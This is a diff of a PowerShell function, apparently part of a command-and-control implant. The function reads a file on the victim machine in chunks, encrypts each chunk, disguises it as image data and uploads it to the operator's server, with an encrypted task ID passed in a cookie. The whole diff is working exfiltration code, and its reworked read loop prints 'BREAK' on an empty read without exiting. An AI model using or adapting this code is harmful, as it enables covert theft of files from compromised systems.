@@ -448,16 +448,14 @@ function Download-File
         [string] $TaskId
     )
     try {
-        $fileName = Resolve-PathSafe $Source
+         $fileName = Resolve-PathSafe $Source
         $randomName = Get-RandomName -Length 5
         $fileExt = [System.IO.Path]::GetExtension($fileName)
         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
         $fullNewname = $Source
-        $bufferSize = 50737418;
-
-        $fs = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite);        
-        $fileSize =(Get-Item $fileName).Length
-        
+        $bufferSize = 10737418;
+        $fs = [System.IO.File]::OpenRead($fileName);  
+        $fileSize =(Get-Item $fileName).Length       
         $chunkSize = $fileSize / $bufferSize
         $totalChunks = [int][Math]::Ceiling($chunkSize)
         if ($totalChunks -lt 1) {$totalChunks = 1}
@@ -466,18 +464,21 @@ function Download-File
         $Chunk = 1
         $finfo = new-object System.IO.FileInfo ($fileName)
         $size = $finfo.Length
-        $str = New-Object System.IO.BinaryReader($fs);
+        $str = New-Object System.IO.MemoryStream;
+        $buffer = New-Object byte[] $bufferSize;
         do {
+            $read = $fs.Read($buffer, 0, $buffer.Length);
+            if ($read -lt 0 -or $read -eq 0) {write-output "BREAK"}
+            $str.Write($buffer, 0, $read);
             $ChunkStr = $Chunk.ToString("00000")
             $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
             $preNumbers = New-Object byte[] 10
-            $preNumbers = ($ChunkedByte+$totalChunkByte)
-            $readSize = $bufferSize;
-            $chunkBytes = $str.ReadBytes($readSize);
+            $preNumbers = ($ChunkedByte+$totalChunkByte)           
             $eid = Encrypt-String $key $TaskId
-            $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)
+            $send = Encrypt-Bytes $key ($preNumbers+$str.ToArray())
             $UploadBytes = getimgdata $send
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
+            $str.SetLength(0);
             ++$Chunk 
         } until (($size -= $bufferSize) -le 0);
     } catch {
